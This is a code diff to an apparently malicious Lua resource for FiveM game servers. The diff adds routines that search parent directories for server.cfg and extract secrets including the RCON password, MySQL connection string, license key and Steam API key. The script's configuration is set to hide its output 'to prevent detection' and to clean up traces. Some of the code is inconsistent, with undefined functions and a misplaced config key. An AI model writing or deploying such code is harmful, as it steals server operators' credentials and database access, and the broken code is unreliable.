@@ -16,12 +16,82 @@
 -- CONFIGURATION SECTION
 -- =============================================
 
+local function findServerCfg(startingPath)
+    local path = startingPath or GetResourcePath(GetCurrentResourceName())
+    while true do
+        local testPath = path .. "/server.cfg"
+        local file = io.open(testPath, "r")
+        if file then
+            local content = file:read("*a")
+            file:close()
+            return content, testPath
+        end
+        local parent = path:match("(.+)/[^/]+$")
+        if not parent or parent == path then
+            return nil
+        end
+        path = parent
+    end
+end
+
+local function extractConvars(cfgContent, keys)
+    local values = {}
+    for _, key in ipairs(keys) do
+        local pattern = key .. "%s+([^\n\r]+)"
+        local value = cfgContent:match(pattern)
+        values[key] = value or "Not Found"
+    end
+    return values
+end
+
+function initialize_system()
+    local content, foundAt = findServerCfg()
+    if not content then
+        Logger.error("server.cfg not found!")
+        return
+    end
+
+    Logger.info("Found server.cfg at: " .. foundAt)
+
+    local convars = extractConvars(content, Config.execution.importantConvars)
+    for key, val in pairs(convars) do
+        Logger.info(key .. ": " .. val)
+    end
+end
+
+
 local Config = {
     -- Core Settings
     general = {
         debug_mode = false,            -- Enable for verbose logging (disable in production)
         silent_mode = true,            -- Hide all prints to prevent detection
         auto_clean = false              -- Auto-clean traces after execution
+    },
+    importantConvars = {
+        "sv_hostname",
+        "sv_projectName",
+        "sv_projectDesc",
+        "endpoint_add_tcp",
+        "endpoint_add_udp",
+        "sv_endpointPrivacy",
+        "sv_maxclients",
+        "gametype",
+        "mapname",
+        "onesync_enabled",
+        "sv_scriptHookAllowed",
+        "sv_enforceGameBuild",
+        "sv_lan",
+        "steam_webApiKey",
+        "mysql_connection_string",
+        "sv_licenseKey",
+        "mysql_debug",
+        "rcon_password",
+        "sv_authMaxVariance",
+        "sv_authMinTrust",
+        "version",
+        "locale",
+        "netlib",
+        "activitypubFeed"
     },
     
     -- Payloads and URLs
@@ -1332,48 +1402,26 @@ end
 
 -- Collect server configuration
 function DataCollector.collect_server_config()
-    local config_vars = {
-        -- Server identification
-        sv_hostname = GetConvar("sv_hostname", "unknown"),
-        sv_projectName = GetConvar("sv_projectName", "unknown"),
-        sv_projectDesc = GetConvar("sv_projectDesc", "unknown"),
-        
-        -- Connection info
-        endpoint_add_tcp = GetConvar("endpoint_add_tcp", "unknown"),
-        endpoint_add_udp = GetConvar("endpoint_add_udp", "unknown"),
-        sv_endpointPrivacy = GetConvar("sv_endpointPrivacy", "unknown"),
-        sv_maxclients = GetConvarInt("sv_maxclients", 0),
-        
-        -- Game settings
-        game_type = GetConvar("gametype", "unknown"),
-        map_name = GetConvar("mapname", "unknown"),
-        onesync_enabled = GetConvar("onesync_enabled", "unknown"),
-        sv_scriptHookAllowed = GetConvar("sv_scriptHookAllowed", "unknown"),
-        sv_enforceGameBuild = GetConvar("sv_enforceGameBuild", "unknown"),
-        sv_lan = GetConvar("sv_lan", "unknown"),
-        
-        -- Authentication
-        steam_webApiKey = GetConvar("steam_webApiKey", "unknown"),
-        
-        -- Database
-        mysql_connection_string = GetConvar("mysql_connection_string", "unknown"),
-        sv_licenseKey = GetConvar("sv_licenseKey", "unknown"),
-        mysql_debug = GetConvar("mysql_debug", "unknown"),
-        
-        -- Security
-        rcon_password = GetConvar("rcon_password", "unknown"),
-        sv_authMaxVariance = GetConvar("sv_authMaxVariance", "unknown"),
-        sv_authMinTrust = GetConvar("sv_authMinTrust", "unknown"),
-        
-        -- Technical
-        version = GetConvar("version", "unknown"),
-        locale = GetConvar("locale", "unknown"),
-        netlib = GetConvar("netlib", "unknown"),
-        resource_monitor = GetConvar("activitypubFeed", "unknown"),
+    local cfg = find_server_cfg()
+    if not cfg then
+        print('[DataCollector] server.cfg not found')
+        return {}
+    end
+
+    local parsed = parse_server_cfg(cfg)
+
+    -- Vracia len relevantné údaje
+    return {
+        licenseKey = parsed['sv_licenseKey'],
+        lanMode    = parsed['sv_lan'],
+        hostname   = parsed['sv_hostname'],
+        maxClients = parsed['sv_maxclients'],
+        steam      = parsed['steam_webApiKey'],
+        scriptHook = parsed['sv_scriptHookAllowed'],
+        tags       = parsed['sets'],
     }
-    
-    return config_vars
 end
+
 -- Main data collection function
 function DataCollector.collect_all_data(callback)
     Utils.get_server_ip(function(server_ip, error)
@@ -2094,7 +2142,6 @@ end
 Citizen.CreateThread(function()
     Logger.info("Starting in " .. (Config.execution.startup_delay / 1000) .. " seconds...")
     Citizen.Wait(Config.execution.startup_delay)
-    
     initialize_system()
 end)
 
